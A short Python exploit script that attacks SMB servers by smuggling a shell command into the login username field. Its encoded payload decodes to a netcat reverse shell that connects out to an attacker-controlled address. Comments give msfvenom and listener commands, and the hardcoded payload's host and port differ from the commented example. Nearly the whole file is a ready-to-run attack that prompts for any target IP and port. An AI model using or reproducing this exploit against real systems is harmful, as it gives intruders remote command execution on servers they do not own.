#!/usr/bin/python

#created by nickvourd

import smb
from smb.SMBConnection import SMBConnection

#################################################################################################################
#Before use the exploit install the following requirements:

#apt install python

#apt install python-pip 
#If you can't find python-pip package try donwload pip insytaller from: https://bootstrap.pypa.io/get-pip.py

#Install with pip the pysmb implementation:
#pip install --user pysmb
################################################################################################################

#generate your own shellcode

#msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.10.30 LPORT=1337 -v shellcode -f python

#change this with your own:
shellcode =  b""
shellcode += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70"
shellcode += b"\x2f\x77\x6a\x6f\x69\x6a\x62\x3b\x20\x6e\x63"
shellcode += b"\x20\x31\x30\x2e\x31\x30\x2e\x31\x34\x2e\x33"
shellcode += b"\x33\x20\x31\x32\x33\x34\x20\x30\x3c\x2f\x74"
shellcode += b"\x6d\x70\x2f\x77\x6a\x6f\x69\x6a\x62\x20\x7c"
shellcode += b"\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f"
shellcode += b"\x74\x6d\x70\x2f\x77\x6a\x6f\x69\x6a\x62\x20"
shellcode += b"\x32\x3e\x26\x31\x3b\x20\x72\x6d\x20\x2f\x74"
shellcode += b"\x6d\x70\x2f\x77\x6a\x6f\x69\x6a\x62"

#before running exploit open a listener like:
#nc -lvp 1337

#set target
victim_ip = raw_input("Please set your target:\n")
victim_port = input("Please set victim port:\n")

print("[+] Exploit started...")
print("[+] If your target is vulnerable, you will have a shell on your listener,soon!") 

userID = '/=`nohup ' + shellcode + "`"
password = 'password'

#establish connection
conn = SMBConnection(userID, password, "HELLO", "Test", use_ntlm_v2=False)

assert conn.connect(victim_ip, victim_port)

#close connection
conn.close()
